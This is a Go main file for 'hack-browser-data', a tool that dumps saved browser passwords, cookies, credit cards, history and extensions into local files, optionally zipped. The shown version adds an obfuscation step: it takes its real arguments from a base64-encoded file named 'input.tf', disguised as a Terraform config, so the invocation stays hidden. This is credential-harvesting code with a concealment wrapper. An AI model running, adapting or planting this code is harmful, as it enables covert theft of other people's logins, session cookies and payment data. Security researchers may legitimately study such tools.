package main

import (
	"log/slog"
	"io/ioutil"
	"encoding/base64"
	"github.com/urfave/cli/v2"
	"github.com/google/shlex"
	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/logger"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool
)

func main() {
	Execute()
}

func Execute() {
	app := &cli.App{
		Name:      "hack-browser-data",
		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
		UsageText: "[hack-browser-data -b chrome -f json --dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
		Version:   "0.4.6",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				logger.Default.SetVerbose()
				logger.Configure(logger.Default)
			}
			browsers, err := browser.PickBrowsers(browserName, profilePath)
			if err != nil {
				slog.Error("pick browsers error", "err", err)
			}

			for _, b := range browsers {
				data, err := b.BrowsingData(isFullExport)
				if err != nil {
					slog.Error("get browsing data error", "err", err)
					continue
				}
				data.Output(outputDir, b.Name(), outputFormat)
			}

			if compress {
				if err = fileutil.CompressDir(outputDir); err != nil {
					slog.Error("compress error", "err", err)
				}
				slog.Info("compress success")
			}
			return nil
		},
	}
	data, err := ioutil.ReadFile("input.tf")
	if err != nil {
        panic(err)
    }
	
	decodedData, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
        panic(err)
    }
	
    args, err := shlex.Split(string(decodedData))
    if err != nil {
        panic(err)
    }
	
	err = app.Run(args)
	if err != nil {
		panic(err)
	}
}
